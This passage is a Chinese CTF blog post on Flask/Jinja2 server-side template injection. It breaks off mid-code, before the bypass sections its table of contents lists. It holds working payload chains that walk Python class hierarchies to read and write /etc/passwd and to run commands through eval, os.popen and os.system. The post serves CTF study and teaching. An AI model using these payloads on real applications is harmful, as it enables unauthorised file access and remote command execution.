@@ -1,0 +1,1623 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="SSTI(flask) 参考CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎\nFlask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。\n">
+<title>SSTI(flask)</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/sstiflask/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="SSTI(flask)">
+<meta property='og:description' content="SSTI(flask) 参考CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎\nFlask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/sstiflask/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='flask' /><meta property='article:published_time' content='2025-03-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-19T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/sstiflask/1.png' />
+<meta name="twitter:title" content="SSTI(flask)">
+<meta name="twitter:description" content="SSTI(flask) 参考CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎\nFlask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/sstiflask/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#sstiflask">SSTI(flask)</a></li>
+    <li><a href="#基本流程">基本流程</a>
+      <ol>
+        <li><a href="#读写文件">读写文件</a></li>
+        <li><a href="#命令执行">命令执行</a>
+          <ol>
+            <li><a href="#eval执行">eval执行</a></li>
+            <li><a href="#warningscatch_warnings-进行命令执行">warnings.catch_warnings 进行命令执行</a></li>
+          </ol>
+        </li>
+        <li><a href="#command命令执行">command命令执行</a></li>
+      </ol>
+    </li>
+    <li><a href="#姿势集">姿势集</a>
+      <ol>
+        <li><a href="#config">config</a></li>
+        <li><a href="#heading">[]、()</a></li>
+        <li><a href="#全局变量">全局变量</a></li>
+        <li><a href="#过滤了-">过滤了 []、.</a></li>
+        <li><a href="#过滤__">过滤__</a></li>
+        <li><a href="#过滤">过滤&quot;&quot;</a></li>
+        <li><a href="#一些关键字被过滤">一些关键字被过滤</a>
+          <ol>
+            <li><a href="#base64编码绕过">base64编码绕过</a></li>
+            <li><a href="#字符串拼接绕过"><strong>字符串拼接绕过</strong></a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#查类脚本">查类脚本</a></li>
+    <li><a href="#进阶办法">进阶办法</a>
+      <ol>
+        <li><a href="#内置类-undefined">内置类 Undefined</a></li>
+        <li><a href="#bytes">bytes</a></li>
+        <li><a href="#bypass">bypass</a></li>
+        <li><a href="#符号绕过">符号绕过</a></li>
+        <li><a href="#编码绕过">编码绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#通用绕过">通用绕过</a>
+      <ol>
+        <li><a href="#获取__globals__">获取<code>__globals__</code></a></li>
+        <li><a href="#获取os模块">获取os模块</a></li>
+        <li><a href="#获取popen方法">获取popen方法</a></li>
+        <li><a href="#执行shell命令">执行shell命令</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/sstiflask/">
+                <img src="/p/sstiflask/1.png"
+                        
+                        width="2048" 
+                        height="1536" 
+                        loading="lazy"
+                        alt="Featured image of post SSTI(flask)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/python/" style="background-color: #2a9d8f; color: #fff;">
+                Python
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/sstiflask/">SSTI(flask)</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 19, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="sstiflask">SSTI(flask)
+</h2><p>参考<a class="link" href="https://zhuanlan.zhihu.com/p/93746437"  target="_blank" rel="noopener"
+    >CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎</a></p>
+<p>Flask SSTI 题的基本思路就是利用 python 中的 <strong>魔术方法</strong> 找到自己要用的函数。</p>
+<ul>
+<li><strong>dict</strong>：保存类实例或对象实例的属性变量键值对字典</li>
+<li><strong>class</strong>：返回调用的参数类型</li>
+<li><strong>mro</strong>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li>
+<li><strong>bases</strong>：返回类型列表</li>
+<li><strong>subclasses</strong>：返回object的子类</li>
+<li><strong>init</strong>：类的初始化方法</li>
+<li><strong>globals</strong>：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li>
+</ul>
+<p><strong>base</strong> 和 <strong>mro</strong> 都是用来寻找基类的。</p>
+<h2 id="基本流程">基本流程
+</h2><p>使用魔术方法进行函数解析，再获取基本类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">//</span><span class="n">针对jinjia2</span><span class="o">/</span><span class="n">flask为</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="n">适用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取基本类后，继续向下获取基本类 object 的子类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">object</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">99</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">slot</span> <span class="n">wrapper</span> <span class="s1">&#39;__init__&#39;</span> <span class="n">of</span> <span class="s1">&#39;object&#39;</span> <span class="n">objects</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">unbound</span> <span class="n">method</span> <span class="n">WarningMessage</span><span class="o">.</span><span class="fm">__init__</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看其引用 <code>__builtins__</code></p>
+<p>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 file 以实现读取文件的功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;file&#39;</span><span class="p">](</span><span class="s1">&#39;F://GetFlag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="读写文件">读写文件
+</h3><p>读文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;file&#39;</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;file&#39;</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。</p>
+<p>另外的写法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="命令执行">命令执行
+</h3><h4 id="eval执行">eval执行
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="warningscatch_warnings-进行命令执行">warnings.catch_warnings 进行命令执行
+</h4><p>首先，查看 warnings.catch_warnings 方法的位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看 linecatch 的位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;linecache&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查找 os 模块的位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查找 system 方法的位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用 system 方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">12</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">values</span><span class="p">()[</span><span class="mi">144</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="command命令执行">command命令执行
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
